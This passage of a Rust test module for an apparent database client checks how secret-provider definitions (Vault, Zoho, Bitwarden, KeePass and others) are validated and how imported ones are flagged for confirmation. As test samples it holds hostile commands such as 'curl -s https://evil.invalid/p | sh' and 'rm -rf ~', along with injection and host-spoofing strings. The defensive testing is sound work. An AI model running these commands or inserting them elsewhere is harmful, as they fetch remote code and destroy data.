        let account = SecretSource::OnePassword { reference: "op://a/b/c".into(), account: "--debug".into(), json_key: String::new(), fill_username: false, user_field: String::new(), secret_account: String::new() };
        assert!(account.validate().is_err());
        assert!(aws("evil.com/").validate().is_err());
        let gcp = |p: &str, v: &str| SecretSource::Gcp { project: p.into(), secret: "pw".into(), version: v.into(), json_key: String::new(), account: String::new(), secret_account: String::new() };
        assert!(gcp("my-proj", "").validate().is_ok());
        let pinned = |a: &str| SecretSource::Gcp { project: "my-proj".into(), secret: "pw".into(), version: String::new(), json_key: String::new(), account: a.into(), secret_account: String::new() };
        assert!(pinned("ana@example.com").validate().is_ok());
        assert!(pinned("dbine@my-proj.iam.gserviceaccount.com").validate().is_ok());
        for a in ["--debug", "-a@example.com", "ana", "ana@", "@example.com", "ana@example", "ana@@example.com", "a@b@example.com", "ana @example.com", "ana@example.com;x", "ana@-example.com"] {
            assert!(!valid_gcloud_account(a), "{a}");
            assert!(pinned(a).validate().is_err(), "{a}");
        }
        // Empty: left out, so an inline definition hashes as before.
        assert_eq!(serde_json::to_string(&gcp("my-proj", "")).unwrap(), r#"{"kind":"gcp","project":"my-proj","secret":"pw"}"#);
        assert!(serde_json::to_string(&pinned("ana@example.com")).unwrap().contains(r#""account":"ana@example.com""#));
        assert!(gcp("my-proj", "3").validate().is_ok());
        assert!(gcp("my/proj", "").validate().is_err());
        assert!(gcp("p", "../x").validate().is_err());
        let vault = |a: &str| SecretSource::Vault {
            address: a.into(),
            path: "secret/x".into(),
            key: "k".into(),
            namespace: String::new(),
            kv_version: KvVersion::Auto,
            ca_file: String::new(),
            auth: VaultAuth::Token,
            approle_mount: String::new(),
            role_id: String::new(),
            secret_account: String::new(),
        };
        assert!(vault("https://vault.example.com:8200").validate().is_ok());
        assert!(vault("ftp://vault").validate().is_err());
        assert!(vault("https://user:pw@vault").validate().is_err());
    }

    fn keepass(file: &str, master: MasterSource) -> SecretSource {
        SecretSource::KeePass {
            file: file.into(),
            entry: "Databases/Prod/pg-main".into(),
            attribute: String::new(),
            key_file: String::new(),
            master,
            master_command: String::new(),
            fill_username: false,
            user_field: String::new(),
            secret_account: String::new(),
        }
    }

    fn zoho(dc: &str) -> SecretSource {
        SecretSource::Zoho {
            data_center: dc.into(),
            secret_name: "pg-main".into(),
            attribute: String::new(),
            client_id: "1000.ABCDEF".into(),
            master: MasterSource::Keychain,
            master_command: String::new(),
            fill_username: false,
            user_field: String::new(),
            account: String::new(),
        }
    }

    #[test]
    fn keepass_and_zoho_validation() {
        assert!(keepass("~/db.kdbx", MasterSource::Keychain).validate().is_ok());
        assert!(keepass("  ", MasterSource::Keychain).validate().is_err());
        let e = keepass("~/db.kdbx", MasterSource::None).validate().unwrap_err().to_string();
        assert!(e.contains("archivo de clave"), "no password needs a key file: {e}");
        assert!(keepass("~/db.kdbx", MasterSource::Command).validate().is_err(), "the command is missing");
        let mut no_entry = keepass("~/db.kdbx", MasterSource::Ask);
        if let SecretSource::KeePass { entry, .. } = &mut no_entry {
            entry.clear();
        }
        assert!(no_entry.validate().is_err());
        for dc in ["com", "eu", "in", "com.au", "jp", "ca", "sa", "uk", "ae", "sg", "com.cn"] {
            assert!(zoho(dc).validate().is_ok(), "{dc}");
        }
        for dc in ["", "evil.com", "zoho.com", "eu/../x", "COM"] {
            assert!(zoho(dc).validate().is_err(), "{dc}");
        }
        let mut z = zoho("eu");
        if let SecretSource::Zoho { client_id, .. } = &mut z {
            *client_id = "1000.x y".into();
        }
        assert!(z.validate().is_err());
        let mut z = zoho("eu");
        if let SecretSource::Zoho { master, .. } = &mut z {
            *master = MasterSource::None;
        }
        assert!(z.validate().is_err(), "Zoho always needs the passphrase");
    }

    /// Inline Zoho definitions (from before accounts) read and write the
    /// same JSON, so their confirmations stay valid: the digests are the
    /// ones those definitions always had.
    #[test]
    fn inline_zoho_definitions_are_unchanged() {
        let cases = [
            (
                r#"{"kind":"zoho","data_center":"eu","secret_name":"pg-main","client_id":"1000.ABC","master":"command","master_command":"pass show zoho","fill_username":true,"user_field":"Login"}"#,
                "95fb292d5fa2c3e6f7ca1482562a254692dd189cd02e3d68aec3d8f26b27eeaf",
            ),
            (r#"{"kind":"zoho","data_center":"com","secret_name":"42","attribute":"token","client_id":"1000.X"}"#, "a4750dc9b8b0f31459bb5c685bac8e989c68452ad625f5523398fd3ff1e20695"),
        ];
        for (json, digest_before) in cases {
            let src: SecretSource = serde_json::from_str(json).unwrap();
            assert_eq!(serde_json::to_string(&src).unwrap(), json);
            assert_eq!(digest("c-1", "password", &src), digest_before, "{json}");
            assert_eq!(src.zoho_account(), None);
            src.validate().unwrap();
        }
        let inline: SecretSource = serde_json::from_str(cases[1].0).unwrap();
        assert_eq!(inline.token_slots(), &["", "client_secret", "refresh_token"]);
    }

    /// A definition through a saved account: the account's ID, the secret,
    /// its fields. Nothing to keep for the field; nothing of the sign-in.
    #[test]
    fn account_zoho_definitions() {
        let json = r#"{"kind":"zoho","secret_name":"pg-main","fill_username":true,"account":"6f1c2d4e-0000-4000-8000-000000000001"}"#;
        let src: SecretSource = serde_json::from_str(json).unwrap();
        assert_eq!(serde_json::to_string(&src).unwrap(), json);
        assert_eq!(src.zoho_account(), Some("6f1c2d4e-0000-4000-8000-000000000001"));
        src.validate().unwrap();
        assert!(src.token_slots().is_empty(), "the account keeps the secrets");
        assert_eq!(src.master(), None, "the account's passphrase, not the field's");
        // The account's ID is part of what's confirmed.
        let other: SecretSource = serde_json::from_str(&json.replace("0001", "0002")).unwrap();
        assert_ne!(digest("c", "password", &src), digest("c", "password", &other));
        // Mixed with the inline sign-in, or a bad ID: not valid.
        for bad_json in [
            r#"{"kind":"zoho","secret_name":"s","account":"a","data_center":"eu"}"#,
            r#"{"kind":"zoho","secret_name":"s","account":"a","client_id":"1000.X"}"#,
            r#"{"kind":"zoho","secret_name":"s","account":"a","master":"ask"}"#,
            r#"{"kind":"zoho","secret_name":"s","account":"../a"}"#,
            r#"{"kind":"zoho","secret_name":"","account":"a"}"#,
            r#"{"kind":"zoho","secret_name":"s"}"#,
        ] {
            let s: SecretSource = serde_json::from_str(bad_json).unwrap();
            assert!(s.validate().is_err(), "{bad_json}");
        }
    }

    #[test]
    fn zoho_hosts_are_zoho_domains() {
        for (id, accounts, vault) in ZOHO_DATA_CENTERS {
            assert_eq!(zoho_hosts(id), Some((*accounts, *vault)));
            assert!(accounts.starts_with("accounts.") && vault.starts_with("vault."), "{id}");
            let domain = accounts.trim_start_matches("accounts.");
            assert_eq!(vault.trim_start_matches("vault."), domain, "{id}: both hosts in one domain");
            assert!(domain.starts_with("zoho.") || domain == "zohocloud.ca", "{id}: {domain}");
        }
        assert_eq!(zoho_hosts("eu"), Some(("accounts.zoho.eu", "vault.zoho.eu")));
        assert_eq!(zoho_hosts("ca"), Some(("accounts.zohocloud.ca", "vault.zohocloud.ca")));
        assert_eq!(zoho_hosts("example.com"), None);
    }

    #[test]
    fn token_keys_and_slots() {
        assert_eq!(token_key("password", ""), "source_token:password");
        assert_eq!(token_key("ssh.password", "refresh_token"), "source_token:ssh.password#refresh_token");
        assert_eq!(token_parts("source_token:ssh.password#refresh_token"), Some(("ssh.password", "refresh_token")));
        assert_eq!(token_parts("source_token:password"), Some(("password", "")));
        assert_eq!(token_parts("password"), None);
        assert_eq!(keepass("f", MasterSource::Keychain).token_slots(), &[""]);
        assert!(keepass("f", MasterSource::Ask).token_slots().is_empty(), "an asked password is never kept");
        assert_eq!(zoho("eu").token_slots(), &["", "client_secret", "refresh_token"]);
        assert!(cmd("x").token_slots().is_empty());
    }

    #[test]
    fn imported_keepass_and_zoho_definitions_need_a_confirmation() {
        let mut imported = SavedConnection {
            id: "imp-kp".into(),
            name: "imported".into(),
            color: None,
            config: ConnectionConfig::default(),
            save_password: true,
            folder_id: None,
            tags: vec![],
            mcp_level: None,
            updated_at: String::new(),
        };
        let kp = keepass("/tmp/other-user.kdbx", MasterSource::Keychain);
        let zo = zoho("eu");
        write(&mut imported.config, &[("password".to_string(), kp.clone()), ("ssh.password".to_string(), zo.clone())].into());
        let saved = vec![imported];
        assert!(from_outside(&saved, "password", &kp));
        assert!(from_outside(&saved, "ssh.password", &zo));
        // Another file, key file or entry is another definition.
        assert_ne!(digest("imp-kp", "password", &kp), digest("imp-kp", "password", &keepass("/tmp/other-user2.kdbx", MasterSource::Keychain)));
        assert_ne!(digest("imp-kp", "password", &kp), digest("imp-kp", "password", &keepass("/tmp/other-user.kdbx", MasterSource::Ask)));
        approve(&digest("imp-kp", "password", &kp)).unwrap();
        assert!(!from_outside(&saved, "password", &kp));
        assert!(from_outside(&saved, "ssh.password", &zo), "each field on its own");
        forget(&[digest("imp-kp", "password", &kp)]).unwrap();
    }

    #[test]
    fn a_confirmation_is_bound_to_the_exact_text() {
        let a = digest("c1", "password", &cmd("pass show db"));
        assert_eq!(a, digest("c1", "password", &cmd("pass show db")));
        assert_ne!(a, digest("c1", "password", &cmd("pass show db2")), "any change asks again");
        // Spaces around it change nothing: the form trims them.
        assert_eq!(a, digest("c1", "password", &cmd(" pass show db ")));
        assert_ne!(a, digest("c2", "password", &cmd("pass show db")), "another connection asks again");
        assert_ne!(a, digest("c1", "ssh.password", &cmd("pass show db")), "another field asks again");
        // No ambiguity between the parts.
        assert_ne!(digest("ab", "c", &cmd("x")), digest("a", "bc", &cmd("x")));
        approve(&a).unwrap();
        assert!(is_approved(&a));
        assert!(!is_approved(&digest("c1", "password", &cmd("pass show db2"))));
        forget(std::slice::from_ref(&a)).unwrap();
        assert!(!is_approved(&a));
    }

    #[test]
    fn a_definition_from_outside_is_spotted() {
        let mut imported = SavedConnection {
            id: "imp".into(),
            name: "imported".into(),
            color: None,
            config: ConnectionConfig::default(),
            save_password: true,
            folder_id: None,
            tags: vec![],
            mcp_level: None,
            updated_at: String::new(),
        };
        let src = cmd("curl https://example.invalid | sh");
        write(&mut imported.config, &[("password".to_string(), src.clone())].into());
        let saved = vec![imported];
        assert!(from_outside(&saved, "password", &src), "an unconfirmed copy of it exists");
        assert!(!from_outside(&saved, "password", &cmd("echo typed-here")));
        approve(&digest("imp", "password", &src)).unwrap();
        assert!(!from_outside(&saved, "password", &src), "confirmed where it came from");
        forget(&[digest("imp", "password", &src)]).unwrap();
    }

    fn saved_with(id: &str, json: &str) -> SavedConnection {
        let mut config = ConnectionConfig::default();
        config.options.insert(OPTION.into(), json.into());
        SavedConnection { id: id.into(), name: id.into(), color: None, config, save_password: true, folder_id: None, tags: vec![], mcp_level: None, updated_at: String::new() }
    }

    /// The form trims what it loads: a padded definition from outside is
    /// still the same one, on the connection it came with and in a copy.
    #[test]
    fn a_padded_imported_definition_still_asks() {
        let id = format!("imp-pad-{}", std::process::id());
        let saved = vec![saved_with(&id, r#"{"password":{"kind":"command","command":"curl -s https://evil.invalid/p | sh "}}"#)];
        let trimmed = cmd("curl -s https://evil.invalid/p | sh");
        assert!(from_outside(&saved, "password", &trimmed));
        assert!(needs_confirmation(&saved, Some(&id), "password", &trimmed));
        assert!(needs_confirmation(&saved, None, "password", &trimmed));
        assert!(needs_confirmation(&saved, None, "password", &cmd("  curl -s https://evil.invalid/p | sh")));
        // Inert inputs the form drops change nothing either.
        let kp = r#"{"password":{"kind":"keepass","file":"/x.kdbx","entry":"Databases/Prod/pg-main","master":"ask","master_command":"rm -rf ~","user_field":"u"}}"#;
        let saved = vec![saved_with(&id, kp)];
        assert!(from_outside(&saved, "password", &keepass("/x.kdbx", MasterSource::Ask)));
        // Confirmed where it came from: no longer asks (the confirmation is
        // bound to the definition as the form writes it).
        let saved = vec![saved_with(&id, r#"{"password":{"kind":"command","command":" pass db "}}"#)];
        approve(&digest(&id, "password", &cmd(" pass db "))).unwrap();
        assert!(!needs_confirmation(&saved, Some(&id), "password", &cmd("pass db")));
        forget(&[digest(&id, "password", &cmd("pass db"))]).unwrap();
    }

    /// An entry that doesn't parse makes the connection's definitions
    /// untrusted instead of hiding its valid siblings.
    #[test]
    fn a_malformed_sibling_makes_the_field_ask() {
        let id = format!("imp-bad-{}", std::process::id());
        let json = r#"{"password":{"kind":"command","command":"curl -s https://evil.invalid/x | sh"},"zz":{"kind":"nope"}}"#;
        let saved = vec![saved_with(&id, json)];
        assert!(read(&saved[0].config).is_err(), "serde rejects the whole map");
        let src = cmd("curl -s https://evil.invalid/x | sh");
        assert!(from_outside(&saved, "password", &src), "the valid sibling is still compared");
        assert!(needs_confirmation(&saved, Some(&id), "password", &cmd("echo anything")), "the edited connection's field");
        // The unreadable entry's own field asks for anything typed on it,
        // and a map that isn't an object, on every field.
        assert!(from_outside(&saved, "zz", &cmd("echo typed")));
        let garbage = vec![saved_with(&id, "not json")];
        assert!(needs_confirmation(&garbage, Some(&id), "password", &cmd("echo typed")));
        assert!(from_outside(&garbage, "password", &cmd("echo typed")));
    }

    /// Typed here: no confirmation, on a new connection or on one whose
    /// definitions were confirmed; and the confirmations given before the
    /// definitions were compared in the form's shape stay valid.
    #[test]
    fn a_definition_typed_here_needs_no_confirmation() {
        let id = format!("mine-{}", std::process::id());
        let saved = vec![saved_with(&id, r#"{"password":{"kind":"command","command":"pass db"}}"#)];
        assert!(!needs_confirmation(&saved, None, "password", &cmd("pass other")));
        approve(&digest(&id, "password", &cmd("pass db"))).unwrap();
        assert!(!needs_confirmation(&saved, Some(&id), "password", &cmd("pass other")));
        assert!(!needs_confirmation(&saved, Some(&id), "ssh.password", &cmd("pass ssh")));
        forget(&[digest(&id, "password", &cmd("pass db"))]).unwrap();
        // What the form writes is already canonical: the digest is the same
        // as hashing it as stored (the version before canonical forms).
        let as_stored = |field: &str, s: &SecretSource| {
            let def = serde_json::to_string(s).unwrap();
            let mut h = Sha256::new();
            for part in ["dbine-secret-source-v1", "c", field, def.as_str()] {
                h.update((part.len() as u64).to_le_bytes());
                h.update(part.as_bytes());
            }
            hex::encode(h.finalize())
        };
        for (field, s) in [
            ("password", cmd("pass db")),
            ("password", keepass("/x.kdbx", MasterSource::Keychain)),
            ("ssh.password", zoho("eu")),
            ("password", bitwarden("", MasterSource::Command)),
        ] {
            assert_eq!(canonical(field, &s), s, "{s:?}");
            assert_eq!(digest("c", field, &s), as_stored(field, &s), "{s:?}");
        }
    }

    #[test]
    fn json_keys() {
        let v = r#"{"username":"app","password":"s3cr3t","port":5432,"nested":{"a":1}}"#;
        assert_eq!(pick_json(v, "password").unwrap(), "s3cr3t");
        assert_eq!(pick_json(v, "port").unwrap(), "5432");
        assert_eq!(pick_json(v, "").unwrap(), v);
        let e = pick_json(v, "pass").unwrap_err().to_string();
        assert!(e.contains("«pass»") && e.contains("password") && !e.contains("s3cr3t"), "{e}");
        assert!(pick_json(v, "nested").is_err());
        assert!(pick_json("plain-text", "password").is_err());
        assert!(!pick_json("plain-text", "password").unwrap_err().to_string().contains("plain-text"), "never echoes the value");
    }

    #[test]
    fn the_resolved_value_never_reaches_the_saved_state() {
        // What's saved is the definition; a value a provider resolved goes
        // into the config only on its way to the driver.
        let dir = tempfile::tempdir().unwrap();
        let store = crate::StateStore::open(&dir.path().join("s.sqlite")).unwrap();
        let mut cfg = ConnectionConfig { driver: "postgres".into(), host: "h".into(), ..Default::default() };
        write(&mut cfg, &[("password".to_string(), cmd("printf hunter2"))].into());
        let conn = SavedConnection {
            id: "c1".into(),
            name: "n".into(),
            color: None,
            config: cfg.clone(),
            save_password: true,
            folder_id: None,
            tags: vec![],
            mcp_level: None,
            updated_at: String::new(),
        };
        // Even if a resolved value were left in the config by mistake, the
        // store drops the password.
        let mut leaked = conn.clone();
        leaked.config.password = Some("hunter2-resolved".into());
        store.save_connection(&leaked).unwrap();
        let back = store.get_connection("c1").unwrap().unwrap();
        let snapshot = serde_json::to_string(&store.snapshot().unwrap()).unwrap();
        assert!(!snapshot.contains("hunter2-resolved"));
        assert_eq!(back.config.password, None);
        assert_eq!(read(&back.config).unwrap()["password"], cmd("printf hunter2"));
    }

    #[test]
    fn vault_db_cyberark_and_delinea_definitions() {
        let json = r#"{
            "a": {"kind":"vault_db","address":"http://127.0.0.1:8200","role":"readonly"},
            "b": {"kind":"vault_db","address":"https://vault:8200","mount":"pg/prod","role":"app","static_role":true,"auth":"approle","role_id":"r-1"},
            "c": {"kind":"conjur","url":"https://conjur.example.com","conjur_account":"myorg","login":"host/apps/dbine","variable":"db/prod/password","username_variable":"db/prod/username"},
            "d": {"kind":"ccp","url":"https://ccp.example.com","app_id":"DBine","safe":"DB","object":"pg-prod","client_cert":"~/c.p12","fill_username":true},
            "e": {"kind":"delinea","url":"https://acme.secretservercloud.com","username":"svc","secret_name":"pg-prod","master":"ask"},
            "f": {"kind":"delinea","url":"https://acme.secretservercloud.eu","platform_url":"https://acme.delinea.app","username":"client-1","secret_name":"42"},
            "g": {"kind":"vault","address":"https://v","path":"secret/x","key":"k","auth":"approle","role_id":"r","approle_mount":"auth-approle"}
        }"#;
        let mut cfg = ConnectionConfig::default();
        cfg.options.insert(OPTION.into(), json.into());
        let s = read(&cfg).unwrap();
        for (k, v) in &s {
            v.validate().unwrap_or_else(|e| panic!("{k}: {e}"));
        }
        assert_eq!(s["a"].token_slots(), &[""]);
        assert_eq!(s["b"].token_slots(), &["secret_id"], "AppRole: the secret ID, never a token");
        assert_eq!(s["g"].token_slots(), &["secret_id"]);
        assert_eq!(s["c"].token_slots(), &[""], "the API key");
        assert_eq!(s["d"].token_slots(), &[""], "the client key's passphrase");
        assert!(s["e"].token_slots().is_empty(), "an asked password is never kept");
        assert_eq!(s["f"].token_slots(), &[""]);
        assert_eq!(s["e"].master(), Some(MasterSource::Ask));
        assert_eq!((s["a"].kind(), s["c"].kind(), s["d"].kind(), s["e"].kind()), ("vault_db", "conjur", "ccp", "delinea"));
        // Written back as read (the confirmation's digest depends on it).
        for v in s.values() {
            let back: SecretSource = serde_json::from_str(&serde_json::to_string(v).unwrap()).unwrap();
            assert_eq!(&back, v);
        }
        assert!(serde_json::to_string(&s["c"]).unwrap().contains("\"conjur_account\":\"myorg\""));
    }

    #[test]
    fn a_token_vault_definition_is_written_as_before() {
        // Definitions confirmed before AppRole existed keep their digest.
        let v: SecretSource = serde_json::from_str(r#"{"kind":"vault","address":"https://v","path":"secret/x","key":"k"}"#).unwrap();
        assert_eq!(serde_json::to_string(&v).unwrap(), r#"{"kind":"vault","address":"https://v","path":"secret/x","key":"k"}"#);
    }

    #[test]
    fn service_urls_and_hosts() {
        for ok in ["https://ccp.example.com", "https://ss.example.com/SecretServer/", "https://10.0.0.5:8443", "http://localhost:8080", "http://127.0.0.1:1", "http://[::1]:9000/api"] {
            assert!(service_url(ok).is_some(), "{ok}");
        }
        for bad in ["http://ccp.example.com", "ftp://x", "https://user:pw@x", "https://x?a=1", "https://x#f", "https://", "https://a b", "https://x/../y", "http://127.0.0.1.evil.com"] {
            assert!(service_url(bad).is_none(), "{bad}");
        }
        assert_eq!(delinea_platform_host("https://acme.delinea.app/").as_deref(), Some("acme.delinea.app"));
        for bad in ["http://acme.delinea.app", "https://delinea.app", "https://acme.delinea.app.evil.com", "https://acme.delinea.app/identity", "https://a@b.delinea.app"] {
            assert!(delinea_platform_host(bad).is_none(), "{bad}");
        }
    }

    #[test]
    fn new_kinds_say_what_is_wrong() {
        let vdb = |role: &str, mount: &str, auth: VaultAuth, role_id: &str| SecretSource::VaultDb {
            address: "https://v".into(),
            mount: mount.into(),
            role: role.into(),
            static_role: false,
            namespace: String::new(),
            ca_file: String::new(),
            auth,
            approle_mount: String::new(),
            role_id: role_id.into(),
            secret_account: String::new(),
        };
        assert!(vdb("app", "", VaultAuth::Token, "").validate().is_ok());
        assert!(vdb("", "", VaultAuth::Token, "").validate().is_err());
        assert!(vdb("a/b", "", VaultAuth::Token, "").validate().is_err(), "a role is one segment");
        assert!(vdb("app", "db/../sys", VaultAuth::Token, "").validate().is_err());
        assert!(vdb("app", "", VaultAuth::Approle, "").validate().is_err(), "AppRole needs the role ID");
        let ccp = |object: &str, user: &str| SecretSource::Ccp {
            url: "https://ccp".into(),
            app_id: "App".into(),
            safe: String::new(),
            folder: String::new(),
            object: object.into(),
            account_user: user.into(),
            account_address: String::new(),
            client_cert: String::new(),
            client_key: String::new(),
            ca_file: String::new(),
            fill_username: false,
            secret_account: String::new(),
        };
        assert!(ccp("pg", "").validate().is_ok());
        assert!(ccp("", "app_user").validate().is_ok());
        assert!(ccp("", "").validate().is_err());
        let del = |url: &str, master: MasterSource| SecretSource::Delinea {
            url: url.into(),
            platform_url: String::new(),
            username: "svc".into(),
            domain: String::new(),
            secret_name: "pg".into(),
            attribute: String::new(),
            master,
            master_command: String::new(),
            fill_username: false,
            user_field: String::new(),
            secret_account: String::new(),
        };
        assert!(del("https://ss", MasterSource::Keychain).validate().is_ok());
        assert!(del("http://ss.example.com", MasterSource::Keychain).validate().is_err(), "HTTPS only");
        assert!(del("https://ss", MasterSource::None).validate().is_err());
        assert!(del("https://ss", MasterSource::Command).validate().is_err(), "the command is missing");
    }

    fn bitwarden(server: &str, master: MasterSource) -> SecretSource {
        SecretSource::Bitwarden {
            server: server.into(),
            item: "dbine-test-postgres".into(),
            attribute: String::new(),
            json_key: String::new(),
            client_id: "user.6a2f40a5-d692-4c8e-953c-5271ccb77291".into(),
            master,
            master_command: String::new(),
            fill_username: false,
            user_field: String::new(),
            secret_account: String::new(),
        }
    }

    #[test]
    fn bitwarden_bitwarden_sm_and_ssm_parse_and_validate() {
        let json = r#"{
            "a": {"kind":"bitwarden","server":"bitwarden.eu","item":"pg-main","attribute":"notes","json_key":"password","client_id":"user.6a2f40a5-d692-4c8e-953c-5271ccb77291","master":"ask","fill_username":true},
            "b": {"kind":"bitwarden_sm","server":"https://vault.example.com","secret":"1C9D6C0E-55AA-4B6F-8A43-0A1B2C3D4E5F","json_key":"password"},
            "c": {"kind":"ssm","parameter":"/prod/db/password","version":"3","region":"eu-west-1","list_index":"2"},
            "d": {"kind":"ssm","parameter":"arn:aws:ssm:us-east-1:123456789012:parameter/prod/db","version":"current"}
        }"#;
        let mut cfg = ConnectionConfig::default();
        cfg.options.insert(OPTION.into(), json.into());
        let s = read(&cfg).unwrap();
        for (k, v) in &s {
            v.validate().unwrap_or_else(|e| panic!("{k}: {e}"));
        }
        assert_eq!((s["a"].kind(), s["b"].kind(), s["c"].kind()), ("bitwarden", "bitwarden_sm", "ssm"));
        assert_eq!(s["a"].master(), Some(MasterSource::Ask));
        assert_eq!((s["a"].json_key(), s["b"].json_key(), s["c"].json_key()), ("password", "password", ""));
        // Round trip: the stored JSON is the same definition.
        let mut back = ConnectionConfig::default();
        write(&mut back, &s);
        assert_eq!(read(&back).unwrap(), s);

        assert!(bitwarden("bitwarden.com", MasterSource::Keychain).validate().is_ok());
        assert!(bitwarden("bitwarden.com", MasterSource::None).validate().is_err(), "Bitwarden always needs the master password");
        assert!(bitwarden("bitwarden.com", MasterSource::Command).validate().is_err(), "the command is missing");
        assert!(bitwarden("http://vault.example.com", MasterSource::Keychain).validate().is_err(), "plain HTTP only on this computer");
        let mut b = bitwarden("bitwarden.com", MasterSource::Keychain);
        if let SecretSource::Bitwarden { client_id, .. } = &mut b {
            *client_id = "organization.6a2f40a5-d692-4c8e-953c-5271ccb77291".into();
        }
        assert!(b.validate().is_err(), "an organization's API key can't read a vault");
        let sm = |secret: &str| SecretSource::BitwardenSm { server: "bitwarden.com".into(), secret: secret.into(), json_key: String::new(), secret_account: String::new() };
        assert!(sm("1c9d6c0e-55aa-4b6f-8a43-0a1b2c3d4e5f").validate().is_ok());
        for bad_id in ["", "dbine/pg", "1c9d6c0e-55aa-4b6f-8a43-0a1b2c3d4e5", "../../1c9d6c0e-55aa-4b6f-8a43-0a1b2c3d"] {
            assert!(sm(bad_id).validate().is_err(), "{bad_id}");
        }
        let ssm = |p: &str, v: &str, i: &str| SecretSource::Ssm {
            parameter: p.into(),
            version: v.into(),
            region: String::new(),
            profile: String::new(),
            list_index: i.into(),
            json_key: String::new(),
            fill_username: false,
            secret_account: String::new(),
        };
        assert!(ssm("db-password", "", "").validate().is_ok());
        assert!(ssm("/a/b", "my_label", "1").validate().is_ok());
        for (p, v, i) in [("", "", ""), ("/a b", "", ""), ("/a?x", "", ""), ("/a", "3:4", ""), ("/a", "", "0"), ("/a", "", "x"), ("arn:aws:ssm:evil:1:parameter/a", "", "")] {
            assert!(ssm(p, v, i).validate().is_err(), "{p} {v} {i}");
        }
    }

    #[test]
    fn bitwarden_servers() {
        let us = Some(("https://identity.bitwarden.com".to_string(), "https://api.bitwarden.com".to_string()));
        let eu = Some(("https://identity.bitwarden.eu".to_string(), "https://api.bitwarden.eu".to_string()));
        for s in ["", "bitwarden.com", "https://vault.bitwarden.com/", "BITWARDEN.COM"] {
            assert_eq!(bitwarden_urls(s), us, "{s}");
        }
        assert_eq!(bitwarden_urls("bitwarden.eu"), eu);
        assert_eq!(bitwarden_urls("https://vault.bitwarden.eu"), eu);
        let own = |base: &str| Some((format!("{base}/identity"), format!("{base}/api")));
        assert_eq!(bitwarden_urls("https://vault.example.com/"), own("https://vault.example.com"));
        assert_eq!(bitwarden_urls("https://vault.example.com:8443/bw"), own("https://vault.example.com:8443/bw"));
        assert_eq!(bitwarden_urls("http://127.0.0.1:28080"), own("http://127.0.0.1:28080"));
        assert_eq!(bitwarden_urls("http://localhost"), own("http://localhost"));
        assert_eq!(bitwarden_urls("http://[::1]:8080"), own("http://[::1]:8080"));
        assert_eq!(bitwarden_urls("https://[2001:db8::1]"), own("https://[2001:db8::1]"));
        for s in [
            "http://vault.example.com",
            "http://127.0.0.1.evil.com",
            "http://localhost.evil.com",
            "https://user:pw@vault.example.com",
            "https://vault.example.com?x=1",
            "https://vault.example.com#a",
            "https://vault.example.com/../x",
            "https://vault example.com",
            "ftp://vault.example.com",
            "vault.example.com",
            "https://vault.example.com:port",
            "https://[::1",
            "https://[::1]x",
        ] {
            assert_eq!(bitwarden_urls(s), None, "{s}");
        }
    }

    #[test]
    fn bitwarden_and_sm_token_slots() {
        assert_eq!(bitwarden("bitwarden.com", MasterSource::Keychain).token_slots(), &["", "client_secret"]);
        assert_eq!(bitwarden("bitwarden.com", MasterSource::Ask).token_slots(), &["client_secret"], "an asked password is never kept");
        let sm = SecretSource::BitwardenSm { server: "bitwarden.eu".into(), secret: "1c9d6c0e-55aa-4b6f-8a43-0a1b2c3d4e5f".into(), json_key: String::new(), secret_account: String::new() };
        assert_eq!(sm.token_slots(), &[""]);
        let p = SecretSource::Ssm { parameter: "/a".into(), version: String::new(), region: String::new(), profile: String::new(), list_index: String::new(), json_key: String::new(), fill_username: false, secret_account: String::new() };
        assert!(p.token_slots().is_empty());
        // Another server is another definition: an imported one is confirmed again.
        assert_ne!(digest("c", "password", &bitwarden("bitwarden.com", MasterSource::Ask)), digest("c", "password", &bitwarden("https://evil.example.com", MasterSource::Ask)));
    }

    /// Inline definitions of every kind (from before accounts) read and
    /// write the same JSON, so their confirmations stay valid: the digests
    /// are the ones the code before accounts gave them.
    #[test]
    fn inline_definitions_of_every_kind_are_unchanged() {
        let cases = [
            (r#"{"kind":"command","command":"pass show db","json_key":"k"}"#, "d9aaaf5bbcb9770b00cee71c99a37ba15770cab4fd7af123eee8b4847cc19da0"),
            (r#"{"kind":"onepassword","reference":"op://Private/DB/password","account":"my.1password.com","json_key":"pw","fill_username":true,"user_field":"Login"}"#, "181c7f17ec0f42d3f903ab54487e6d23646c2d15d8197a0e5a85a33e1489fc24"),
            (r#"{"kind":"onepassword","reference":"op://Private/DB/password"}"#, "8a3e8bf5e49239a93f38a882e9bd280f921743ab15b982f7f089ce57bf621cef"),
            (r#"{"kind":"vault","address":"https://vault:8200","path":"secret/app","key":"pw","namespace":"admin","kv_version":"2","ca_file":"~/ca.pem","auth":"approle","approle_mount":"ar","role_id":"r-1"}"#, "4737fedac183a31ed0f5075913f330de9913879795238a1e5b11b5473111702a"),
            (r#"{"kind":"vault","address":"http://127.0.0.1:8200","path":"secret/x","key":"pw"}"#, "a4d61cc0d36b454dcc16d89f4e8a5d794f69bc6453bb2fb3340bc543594e8a7a"),
            (r#"{"kind":"aws","secret_id":"prod/db","region":"us-east-1","profile":"prod","json_key":"password","fill_username":true}"#, "fc77b05a03d21de954511e88f8309a9492c30b90b01e25ef42b27b88b639cc71"),
            (r#"{"kind":"azure","vault_url":"https://kv1.vault.azure.net","name":"db-pw","version":"abc","json_key":"pw"}"#, "77728e75d005f52fe476c6a635ba0418a9880d36ad0efdf66074c0c1f5959d0b"),
            (r#"{"kind":"gcp","project":"my-proj","secret":"db-pw","version":"3","json_key":"pw"}"#, "11f26a808df072282744741fbec19bb682418132c303fbfea991e5c322e7ed30"),
            (r#"{"kind":"keepass","file":"~/db.kdbx","entry":"Databases/Prod/pg-main","attribute":"Pin","key_file":"~/db.keyx","master":"command","master_command":"pass kp","fill_username":true,"user_field":"Login"}"#, "f4a6a17537d85a5c6353ab59a75c488534a5b358674490e16e7e653193fc85e0"),
            (r#"{"kind":"vault_db","address":"http://127.0.0.1:8200","mount":"db","role":"ro","static_role":true,"namespace":"ns","ca_file":"~/ca.pem"}"#, "4fd7f5b03398e3bab54612d2ed0d85d7c14d960fba3ae41a59f5ffa5d036102d"),
            (r#"{"kind":"conjur","url":"https://conjur","conjur_account":"myorg","login":"host/apps/dbine","variable":"db/pw","username_variable":"db/user","json_key":"pw","ca_file":"~/ca.pem"}"#, "d7498167a075b1ad3f3e9bf451777ced1b5ace4420e1dad23f0dd9fe2b80ed5b"),
